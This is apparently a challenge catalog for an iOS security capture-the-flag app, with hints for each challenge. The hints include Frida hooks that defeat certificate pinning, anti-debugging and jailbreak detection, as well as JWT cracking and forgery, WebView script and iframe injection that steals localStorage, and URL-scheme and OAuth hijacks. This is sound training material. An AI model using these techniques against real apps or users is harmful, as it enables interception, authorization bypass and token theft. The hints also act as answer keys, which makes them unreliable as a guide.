challenges.title: Plaintext Confessions
challenges.description: The app stores a secret during startup. The developer chose the most convenient persistence API available. Convenience is the enemy of security.
challenges.objective: Find the flag stored in the app's key-value storage.
hints: iOS has a simple key-value store that survives app restarts. Designed for user preferences, not secrets.
On jailbroken: /private/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences/<bundle-id>.plist
On non-jailbroken: use iMazing > Apps > App Data > Library > Preferences

challenges.title: The Forgotten Plist
challenges.description: Classic developer mistake: credentials written to the Documents directory for easy debugging. Never cleaned up before shipping.
challenges.objective: Find the config file left in the app's Documents folder.
hints: Check the app's Documents directory — accessible via iTunes File Sharing if UIFileSharingEnabled is set.
On jailbroken: /private/var/mobile/Containers/Data/Application/<UUID>/Documents/
The file is a property list: plutil -p config.plist

challenges.title: SQLite Diary
challenges.description: The app logs events to a local SQLite database. Sensitive data ended up in the events table. No encryption. No access control.
challenges.objective: Extract the flag from the app's SQLite database.
hints: Look in Library/Application Support/ or Documents/ for .sqlite or .db files.
sqlite3 <file>.sqlite 'SELECT * FROM events;'
On jailbroken: find / -name '*.sqlite' 2>/dev/null | grep <bundle-id>

challenges.title: Keychain? Sure, But...
challenges.description: The developer did use the Keychain — good instinct. But they set kSecAttrAccessible to kSecAttrAccessibleAlways with no access control. Accessible even when device is locked.
challenges.objective: Extract the flag from the Keychain using keychain-dumper or Objection.
hints: objection -g <bundle-id> explore → ios keychain dump
keychain_dumper on jailbroken device
Look for key named 'ctf_s4_secret' in the dump

challenges.title: CoreData Secrets
challenges.description: CoreData is an ORM, not a security layer. SecretEntity stores sensitive profile data in an unencrypted SQLite store.
challenges.objective: Find and query the CoreData SQLite store to extract the flag from SecretEntity.
hints: CoreData uses SQLite. Find the .sqlite file in Library/Application Support/
Table name: ZSECRETENTITY, column: ZFLAGVALUE (CoreData Z-prefix convention)
sqlite3 <store>.sqlite 'SELECT ZFLAGVALUE FROM ZSECRETENTITY;'

challenges.title: Console.app Knows Everything
challenges.description: NSLog writes to the system log. This developer logs everything, including secrets. The flag is NSLog'd when you visit the challenge screen.
challenges.objective: Capture the NSLog output when navigating to the Log Leak challenge.
hints: Xcode: Window > Devices and Simulators > Open Console
CLI: idevicesyslog | grep IOSCTF
The log fires when you tap this challenge cell in the app

challenges.title: The Encrypted Lie
challenges.description: The app 'encrypts' its secrets with single-byte XOR. The key is a string constant in the binary, 12 bytes after the encrypted blob reference. Decryption is an exercise for the reader.
challenges.objective: Find vault.enc, locate the XOR key in the binary via Ghidra, decrypt, extract the flag.
hints: The encrypted file is at Documents/vault.enc
In Ghidra: search for string 'vault.enc' — XOR key is in the same function
Python: bytes(b ^ key for b in open('vault.enc','rb').read())

challenges.title: Keychain Group Pivot
challenges.description: This app writes a secret to shared Keychain access group 'com.iosctf.shared'. Any app with the same Team ID can read it. A companion app is provided to demonstrate the pivot.
challenges.objective: Build and install CTFCompanion, use it to read the shared Keychain group secret.
hints: Access group: 'com.iosctf.shared' — both apps need same Team ID in entitlements
SecItemCopyMatching with kSecAttrAccessGroup = 'com.iosctf.shared'
Mirrors real-world app suite Keychain sharing vulnerabilities

challenges.title: Cleartext Credentials
challenges.description: The app sends a login request over plain HTTP to the companion server. Credentials fly across the wire in cleartext.
challenges.objective: Intercept the HTTP POST and find the flag in the server response.
hints: Configure Burp proxy on Mac, set iPhone WiFi HTTP Proxy to your Mac IP:8080
Tap 'Authenticate' in this challenge — app sends POST /api/network/login over HTTP
Any credentials work — the server echoes back the flag in the response

challenges.title: Trust Everyone
challenges.description: URLSession delegate accepts any certificate. Your Burp cert doesn't even need to be installed — the app trusts everything.
challenges.objective: Intercept the HTTPS request without installing Burp's CA cert.
hints: Use Burp Suite with default cert — the app won't reject it
GET /api/network/insecure-data — flag is in the response body
The NSURLSessionDelegate returns .useCredential for all auth challenges

challenges.title: Pinning? What Pinning?
challenges.description: URLSession certificate pinning via didReceive challenge delegate. Checks cert hash against pinned value. Bypass at the ObjC runtime level.
challenges.objective: Bypass URLSession certificate pinning using Objection or a custom Frida script.
hints: objection -g com.iosctf.app explore --startup-command 'ios sslpinning disable'
Or hook: Security.SecTrustEvaluateWithError
Frida: hook the URLSessionDelegate method directly

challenges.title: The WebSocket Whisper
challenges.description: App connects to a WebSocket. Auth token is base64(username:timestamp) — no signing. Token is replayable within 300 seconds.
challenges.objective: Intercept or forge the WebSocket auth token to receive the flag.
hints: Token format: base64(username + ':' + unix_timestamp)
wscat -c ws://<server>:8000/api/ws/challenge
Send: {"token": "<base64_token>"}

challenges.title: JWT Weak Secret
challenges.description: Server issues HS256 JWTs with an embarrassingly weak secret. Crack it, forge admin:true, get the flag.
challenges.objective: Crack the JWT secret, forge an admin token, submit to server.
hints: Intercept token from GET /api/auth/token
hashcat -a 0 -m 16500 <jwt> rockyou.txt
Forge: jwt.encode({'user':'ctf','admin':True}, '<cracked_secret>', 'HS256')

challenges.title: Pinning Deeper
challenges.description: SPKI public key pinning — pins the hash of the server certificate's SubjectPublicKeyInfo. Hook SecTrustEvaluateWithError at the C level.
challenges.objective: Bypass SPKI-based pinning by hooking SecTrustEvaluateWithError with Frida.
hints: Objection's generic SSL bypass may not work. Write a targeted script.
Interceptor.attach(Module.findExportByName('Security', 'SecTrustEvaluateWithError'), ...)
Force return value to 1 (true), set error param to null

challenges.title: OAuth State CSRF
challenges.description: OAuth 2.0 flow with state parameter present but never validated on callback. Classic CSRF. Steal an admin authorization code.
challenges.objective: Manipulate the OAuth callback to receive a code for admin user. Exchange for their token.
hints: Start OAuth flow, intercept the authorization request in Burp
Server issues codes per-user. Modify state= — callback binds code to admin.
POST /api/oauth/token — redirect_uri not validated against registration

challenges.title: URL Scheme Hijack
challenges.description: The app registers ctfapp:// and handles parameters without validation. Any app or web page can trigger it.
challenges.objective: Craft a URL that triggers the scheme handler and reveals the flag.
hints: Open Safari: ctfapp://reveal?key=admin
The handler reads the 'key' param — what value reveals the flag?
Or trigger programmatically: UIApplication.shared.open(URL(string:'ctfapp://reveal?key=...')!)

challenges.title: postMessage Eavesdrop
challenges.description: WKWebView loads a local HTML page using window.webkit.messageHandlers. Handler name is in the HTML source.
challenges.objective: Discover the message handler name and call it with correct payload to retrieve flag.
hints: Extract IPA and inspect Resources/ for the bundled HTML file
window.webkit.messageHandlers.<name>.postMessage({action: 'getFlag'})
Use Safari DevTools or Frida to call the handler

challenges.title: Bridge Exposed
challenges.description: WKWebView loads remote content and exposes a native handler called 'flagBridge'. No origin validation. Inject JS via MITM.
challenges.objective: Inject JavaScript into the WebView response via Burp to call the flagBridge handler.
hints: Intercept the page in Burp, inject into response body:
window.webkit.messageHandlers.flagBridge.postMessage({cmd:'retrieve', auth:'ctfuser'})
The handler alert()s the flag — hook document.write or alert() in Frida to capture it

challenges.title: Universal Link Confusion
challenges.description: AASA file matches /* paths. Server has an open redirect at /redirect?url=. Chain them to hijack universal link parameters.
challenges.objective: Exploit the AASA misconfiguration + open redirect to invoke the app with attacker-controlled params.
hints: AASA at /.well-known/apple-app-site-association — check the path patterns
Open redirect: /redirect?url=<any_url> with no validation
Chain: https://server/redirect?url=https://server/challenge/W4?flag=steal

challenges.title: The FullStory Pattern
challenges.description: Analytics SDK initialized inside WKWebView exposes a JS interface callable from the loaded page with no origin validation. localStorage exfiltration is possible.
challenges.objective: Exploit the analytics SDK bridge to exfiltrate the session token from WebView localStorage.
hints: Handler name: 'analyticsSDK'
window.webkit.messageHandlers.analyticsSDK.postMessage({type:'capture', target:'localStorage'})
The session token stored in localStorage is the flag

challenges.title: localStorage Theft
challenges.description: WKWebView with shared WKProcessPool and no storage partitioning. Inject a malicious iframe via MITM that reads parent localStorage across origins.
challenges.objective: Inject an iframe via MITM to read the parent page's localStorage and exfiltrate the flag.
hints: Inject: <iframe src='http://localhost:8000/static/steal.html'></iframe> into the response
steal.html: parent.postMessage(localStorage.getItem('ctf_w6_flag'), '*')
Capture postMessage with a second injected event listener or Frida hook

challenges.title: DeepLink Chain
challenges.description: A three-stage chain: URL scheme → WebView load → JS bridge. Each stage has a gate. Bypass them all. This mirrors a realistic multi-stage bug chain.
challenges.objective: Chain URL scheme → WebView load → JS bridge call to extract the flag.
hints: Stage 1: ctfapp://webload?url=<url> — only http://localhost:8000 is whitelisted
Stage 2: Page at /static/chain_page.html calls window.webkit.messageHandlers.chainBridge.postMessage
Stage 3: chainBridge checks HMAC header — key is in UserDefaults (found in S1)

challenges.title: Strings Never Lie
challenges.description: The flag is a plaintext string constant in the binary. No obfuscation. Sitting in __TEXT waiting to be found.
challenges.objective: Extract the flag using strings or Ghidra's string search.
hints: Mac: strings CTFApp | grep IOSCTF
Ghidra: Search > For Strings, filter by 'IOSCTF'
rabin2 -z CTFApp | grep IOSCTF

challenges.title: The ObjC Method
challenges.description: ObjC class CTFFlagStore has method -secretFlagForChallenge: returning the flag for the given ID. ObjC runtime metadata is never stripped.
challenges.objective: Enumerate ObjC classes and call the method directly with Frida.
hints: Frida: ObjC.classes.CTFFlagStore['- secretFlagForChallenge:']('B2')
class-dump -H CTFApp -o ./headers/ then grep for 'secretFlag'
All ObjC method names survive compilation and are enumerable at runtime

challenges.title: Debugger? No Thanks
challenges.description: App calls ptrace(PT_DENY_ATTACH, 0, 0, 0) at startup. The flag is in a method only callable after bypassing this. Hook ptrace to neutralize it.
challenges.objective: Hook ptrace in Frida to bypass PT_DENY_ATTACH, then call the flag-revealing method.
hints: Interceptor.attach(Module.findExportByName(null, 'ptrace'), { onEnter: function(args) { if(args[0].toInt32() == 31) args[0] = ptr(0); }})
PT_DENY_ATTACH = 31
After bypassing: ObjC.classes.CTFAntiDebug['+ revealFlagIfSafe']()

challenges.title: Jailbreak Blindfold
challenges.description: Naive jailbreak detection: checks for /Applications/Cydia.app, /bin/bash, /.installed_unc0ver. Purely file-system based. Hook NSFileManager.
challenges.objective: Bypass jailbreak detection and unlock the challenge content.
hints: objection -g <bundle-id> explore → ios jailbreak disable
Frida: hook NSFileManager fileExistsAtPath: — return false for JB paths
Detection class: CTFJailbreakDetector — find method with class-dump

challenges.title: Class Dump Treasure Hunt
challenges.description: Flag split across three ObjC classes: CTFPart1, CTFPart2, CTFPart3. Each returns one fragment. The assembly order is in a binary string.
challenges.objective: Find all three classes via class-dump, call each method, assemble the flag in the correct order.
hints: class-dump -H CTFApp -o ./headers/ → search for CTFPart1/2/3
Each has: -(NSString *)fragment;
strings CTFApp | grep 'order:' — assembly order is there

challenges.title: The Swizzle
challenges.description: CTFVault -retrieveSecret always returns ACCESS_DENIED. The actual flag logic is gated behind [self isAuthorized] == YES. Swizzle isAuthorized to return YES.
challenges.objective: Frida method swizzle to make isAuthorized return YES, then call retrieveSecret.
hints: ObjC.classes.CTFVault['- isAuthorized'].implementation = ObjC.implement(method, function(self, sel) { return 1; })
Then: ObjC.classes.CTFVault.new()['- retrieveSecret']().toString()
This is the exact technique used in real authorization bypass bugs

challenges.title: JB Detection: Advanced
challenges.description: Multi-layer JB detection: file checks, dyld image scan, Cydia substrate detection, fork() test, ObjC runtime class check. Each layer must be individually bypassed.
challenges.objective: Defeat all detection layers. Write a single reusable Frida script that handles all of them.
hints: Layer 1: NSFileManager fileExistsAtPath: hook
Layer 2: _dyld_get_image_name hook — return null for substrate/cydia paths
Layer 3: fork() hook — return -1 (JB can fork, stock cannot)
Layer 4: NSClassFromString('CydiaSubstrate') hook — return nil
Spawn mode: frida -U -f com.iosctf.app --no-pause -l bypass_all.js

challenges.title: FairPlay Ghost
challenges.description: Flag is decrypted at runtime using a device-derived key. Never written to disk. Exists in memory for ~2 seconds then zeroed. Dump it from memory in that window.
challenges.objective: Hook the decryption function or scan memory for the flag pattern during the live window.
hints: Hook CTFMemoryVault -decryptAndPresent — intercept return value before zeroing
Or memory scan: Process.enumerateRanges('r--').forEach(range => { Memory.scanSync(range.base, range.size, '49 4F 53 43 54 46 7B') })
49 4F 53 43 54 46 7B = IOSCTF{ in hex
Similar technique to FairPlay DRM memory dumping
